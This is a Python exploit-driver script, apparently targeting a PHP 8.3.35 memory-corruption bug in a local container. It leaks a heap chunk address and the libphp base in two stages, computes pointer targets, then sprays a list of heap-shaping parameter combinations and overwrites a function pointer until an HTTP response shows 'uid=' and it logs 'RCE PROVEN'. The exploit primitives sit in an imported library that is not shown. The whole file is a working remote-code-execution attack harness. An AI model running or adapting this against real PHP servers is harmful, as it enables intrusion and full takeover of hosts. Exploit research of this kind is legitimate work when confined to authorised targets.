#!/usr/bin/env python3
"""8.3.35 stage-3 A2-shape scan (fixed parallel reads)."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from p2s8335_lib import *

def main():
    log(f"[*] 8.3.35 A2-shape scan (fixed reads)")
    restart()
    log("[*] stage1...")
    chunk = stage1(PORT)
    if not chunk: log("[-] stage1 failed"); return 1
    log(f"[+] chunk=0x{chunk:x}")
    log("[*] stage2...")
    libphp = stage2(PORT)
    if not libphp: log("[-] stage2 failed"); return 1
    log(f"[+] libphp=0x{libphp:x}")
    htdata = chunk + HTDATA_OFFSET
    zif = libphp + ZIF_OFFSET

    combos = [
        (6, 31, 31),
        (4, 31, 31),
        (8, 31, 31),
        (10, 31, 31),
        (12, 31, 31),
        (6, 16, 16),
        (6, 48, 48),
        (6, 8, 8),
        (6, 64, 64),
        (3, 31, 31),
        (16, 31, 31),
        (20, 31, 31),
    ]
    for n_pads, nl, vl in combos:
        if not container_ok(PORT):
            restart()
            chunk = stage1(PORT); 
            if not chunk: log("  [!] s1 re-fail"); continue
            libphp = stage2(PORT)
            if not libphp: log("  [!] s2 re-fail"); continue
            htdata = chunk + HTDATA_OFFSET
            zif = libphp + ZIF_OFFSET
        rotate(PORT)
        a2_setup(PORT, n_pads, nl, vl)
        b2_write(PORT, htdata, zif)
        time.sleep(0.8)
        status, body = get_proof(PORT)
        hit = (status == 200 and b"uid=" in body)
        log(f"  pads=({n_pads},{nl},{vl}) -> {'HIT' if hit else 'miss'} (http {status})")
        if hit:
            log(f"[+] RCE PROVEN! {body.decode('latin1').strip()}")
            return 0
        if not container_ok(PORT):
            log("  [!] worker died, restarting")
            restart()
    log("[-] no A2 shape worked")
    return 1

if __name__ == "__main__":
    sys.exit(main())
